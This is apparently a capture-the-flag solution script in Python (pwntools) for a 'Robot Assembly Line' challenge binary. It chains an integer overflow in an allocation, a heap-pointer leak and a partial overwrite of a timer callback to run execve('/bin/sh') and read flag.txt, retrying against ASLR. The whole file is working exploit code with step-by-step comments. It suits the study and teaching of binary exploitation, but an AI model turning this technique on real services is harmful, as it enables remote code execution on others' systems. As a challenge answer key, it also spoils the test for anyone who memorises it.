#!/usr/bin/env python3
# Robot Assembly Line exploit.
#
# Chain (see writeup.md for the full explanation):
#   1. Integer overflow on the robots-array allocation -> 1-robot buffer, so
#      robots[1..] overlap later heap chunks (the self-destruct timer objects).
#   2. Non-NUL-terminated name leaks an adjacent timer's list pointer -> heap base.
#   3. A later robot's name overwrites an overlapping *pending* timer's cb_arg
#      (= address of the "/bin/sh" we stashed in robot #1's name) and the low two
#      bytes of its callback pointer, redirecting it to execve@plt via a partial
#      overwrite (1/16 with ASLR because PIE randomizes bits 12-15).
#   4. When that timer fires, execve("/bin/sh", NULL, NULL) runs.
#
# The corruption target is robot #3's timer (it overlaps robot #5 in memory).
# Its self-destruct duration must simply outlast the few hundred milliseconds it
# takes to send robots #3-#5, which the original 1s value does comfortably.
#
# The subtle part (and the only thing that differs from a naive script) is *when*
# we send shell input: see the comment at the send below.
import os
from pwn import *
import sys, time, re, os

# Target from the environment ($HOST/$PORT set by `pwnmake check`) first, then
# pwntools args (HOST=/PORT= on the command line), then a sensible default.
HOST = os.environ.get("HOST") or args.HOST or "localhost"
PORT = int(os.environ.get("PORT") or args.PORT or 23000)

exe = ELF(".build/robots-assemble" if os.path.exists(".build/robots-assemble") else "robots-assemble")
context.binary = exe
context.log_level = args.LOG_LEVEL or "warn"

SECS = 1000 * 1000
SIZEOF_ROBOT = 0x30
# Duration of robot #3's timer == the corruption target. 1s matches the original
# exploit; it only needs to exceed the R3->R5 round-trip time (~0.1s locally).
TARGET_TIMER_S = int(args.TIMER or 1)


def build_robot(r, name, iq, self_aware, evil, timer_us):
    r.recvuntil(b"Name?\n")
    r.send((name + b"\n")[:10])
    r.recvuntil(b"IQ for robot ")
    r.recvuntil(b"?\n")
    r.sendline(str(iq).encode())
    r.recvuntil(b" be self-aware?\n")
    r.sendline(b"y" if self_aware else b"n")
    r.recvuntil(b" be evil?\n")
    r.sendline(b"y" if evil else b"n")
    r.recvuntil(b" (in microseconds)?\n")
    r.sendline(str(timer_us).encode())
    name_out = r.recvuntil(b": \"", drop=True)
    r.recvuntil(b"\"\n")
    return name_out


def attempt():
    r = remote(HOST, PORT)
    try:
        # Integer-overflow the count so count * 0x30 wraps to <= 0x30 (1 robot).
        ovf_size = (1 << 64) // SIZEOF_ROBOT + 1
        assert ovf_size * SIZEOF_ROBOT >= (1 << 64)
        assert (ovf_size * SIZEOF_ROBOT) & ((1 << 64) - 1) <= SIZEOF_ROBOT

        r.recvuntil(b"Enter number of robot turrets to manufacture:\n")
        r.sendline(str(ovf_size).encode())

        # R1: stash "/bin/sh"; long timer so it stays pending (keeps list sorted).
        build_robot(r, b"/bin/sh", 1337, False, False, 95 * SECS)
        # R2: longer timer, so R1's timer ->next points at R2's node (not NULL).
        build_robot(r, b"nonnull", 2, False, False, 96 * SECS)
        # R3: full, NUL-free name leaks the overlapping timer's ->next = heap ptr.
        #     Its own timer is the corruption target that R5 will overwrite.
        leak = build_robot(r, b"0123456789", u32(b"ABCD"), True, True,
                           TARGET_TIMER_S * SECS)[0x10:]
        obj_addr = u64(leak.ljust(8, b"\0"))
        # container_of(&T2->node) then step back from R4's slot to R1's name.
        binsh_addr = obj_addr - 0x10 - 0x90
        log.info("leak=%#x  /bin/sh=%#x", obj_addr, binsh_addr)

        # R4: filler to advance the overlap to R5.
        build_robot(r, b"align", 4, False, False, 99 * SECS)

        # R5: name overwrites the still-pending target timer: cb_arg = &"/bin/sh",
        #     low two bytes of callback -> execve@plt (partial overwrite).
        name = p64(binsh_addr) + p16(exe.plt["execve"] & 0xFFFF)
        r.recvuntil(b"Name?\n")
        r.send(name)

        # Crucially, send NOTHING now: the main thread blocks reading robot #5's
        # IQ, which keeps the process alive until the corrupted timer fires. If we
        # sent commands here they'd be consumed as robot #5's answers instead of
        # reaching the shell. On a wrong partial-overwrite guess the timer jumps
        # somewhere bad and the process dies (EOF); on the 1/16 win it becomes a
        # shell, which only then reads our commands from the socket.
        time.sleep(TARGET_TIMER_S + 1.5)
        try:
            r.sendline(b"echo SHELL_$((13*3))_OK; cat flag.txt")
        except Exception:
            return False
        out = r.recvrepeat(2.0)
        if b"SHELL_39_OK" in out:
            log.success("Got code execution!")
            m = re.search(rb"sun\{[^}]*\}", out)
            if m:
                print(m.group(0).decode())
            else:
                r.sendline(b"cat flag.txt; echo")
                print(r.recvrepeat(1.0).decode(errors="replace"))
            return True
        return False
    finally:
        r.close()


def main():
    tries = int(args.TRIES or 64)
    for i in range(tries):
        log.info("Attempt %d/%d (partial overwrite is 1/16 under ASLR)", i + 1, tries)
        try:
            if attempt():
                return 0
        except (EOFError, PwnlibException) as e:
            log.warn("attempt error: %s", e)
    log.failure("Exhausted attempts")
    return 1


if __name__ == "__main__":
    sys.exit(main())
